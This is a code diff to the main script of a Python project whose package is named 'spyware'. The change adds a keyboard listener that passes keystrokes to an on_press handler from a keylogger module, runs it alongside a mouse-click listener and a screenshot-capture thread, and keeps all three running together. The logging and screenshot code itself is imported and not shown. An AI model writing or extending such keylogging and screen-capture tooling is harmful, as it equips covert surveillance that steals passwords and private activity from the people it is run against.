@@ -1,26 +1,16 @@
-from pynput import mouse
+from pynput import mouse, keyboard
 
-import threading
-
-from spyware.keylogger import on_click
+from spyware.keylogger import on_click, on_press
 from spyware.screenshot import ScreenshotThread
 
 if __name__ == '__main__':
-    # with mouse.Listener(
-    #         on_move=on_move,
-    #         # on_click=on_click,
-    #         on_scroll=on_scroll) as listener:
-    #     listener.join()
-
-    # ...or, in a non-blocking fashion:
-    listener = mouse.Listener(
-        # on_move=on_move,
-        on_click=on_click,
-        # on_scroll=on_scroll
-    )
-    listener.start()
+    mouse_listener = mouse.Listener(on_click=on_click)
+    mouse_listener.start()
+    keyboard_listener = keyboard.Listener(on_press=on_press)
+    keyboard_listener.start()
     screenshot_consumer = ScreenshotThread()
     screenshot_consumer.start()
+
+    mouse_listener.join()
+    keyboard_listener.join()
     screenshot_consumer.join()
-    listener.join()
-    # time.sleep(100)
